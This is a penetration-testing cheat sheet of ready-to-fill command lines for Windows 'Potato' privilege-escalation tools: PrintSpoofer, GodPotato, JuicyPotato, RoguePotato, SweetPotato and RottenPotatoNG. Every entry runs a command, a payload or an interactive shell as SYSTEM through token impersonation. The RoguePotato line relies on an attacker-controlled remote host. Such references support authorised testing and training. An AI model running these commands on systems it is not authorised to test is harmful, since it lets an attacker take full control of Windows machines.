# Potato / PrintSpoofer

## PrintSpoofer

### Interactive SYSTEM shell

Spawn an interactive SYSTEM shell when the Print Spooler impersonation path is available.

```cmd title:"Potato / PrintSpoofer Interactive SYSTEM shell with PrintSpoofer"
PrintSpoofer.exe -i -c cmd
```
<!-- cheat -->

### Execute command

Run a command as SYSTEM.

```cmd title:"Potato / PrintSpoofer Execute command with PrintSpoofer"
PrintSpoofer.exe -c "$command"
```
<!-- cheat
var command
-->

## GodPotato

### Execute command 2

Execute a command as SYSTEM on targets vulnerable to the GodPotato COM/DCOM path.

```cmd title:"Potato / PrintSpoofer Execute command with GodPotato"
GodPotato.exe -cmd "$command"
```
<!-- cheat
var command
-->

## JuicyPotato

### Default trigger

Run a command through JuicyPotato on older Windows builds where the original COM activation path works.

```cmd title:"Potato / PrintSpoofer Execute command with JuicyPotato"
JuicyPotato.exe -l $listen_port -p C:\Windows\System32\cmd.exe -a "/c $command" -t *
```
<!-- cheat
var listen_port
var command
-->

### Explicit CLSID

Use a specific CLSID when the default one fails.

```cmd title:"Potato / PrintSpoofer Execute payload with JuicyPotato CLSID"
JuicyPotato.exe -l $listen_port -p "$payload_path" -t * -c "$clsid"
```
<!-- cheat
var listen_port
var payload_path
var clsid
-->

## RoguePotato

### Execute command 3

Run RoguePotato with a remote OXID resolver host.

```cmd title:"Potato / PrintSpoofer Execute command with RoguePotato"
RoguePotato.exe -r $lhost -e "$command" -l $listen_port
```
<!-- cheat
import tun_ip
var command
var listen_port
-->

## SweetPotato

### Execute payload

Execute a prepared payload through SweetPotato.

```cmd title:"Potato / PrintSpoofer Execute payload with SweetPotato"
SweetPotato.exe -p "$payload_path"
```
<!-- cheat
var payload_path
-->

## RottenPotatoNG

### Trigger token impersonation

Run RottenPotatoNG, then use token impersonation tooling in the same session.

```cmd title:"Potato / PrintSpoofer Run RottenPotatoNG"
RottenPotatoNG.exe
```
<!-- cheat -->
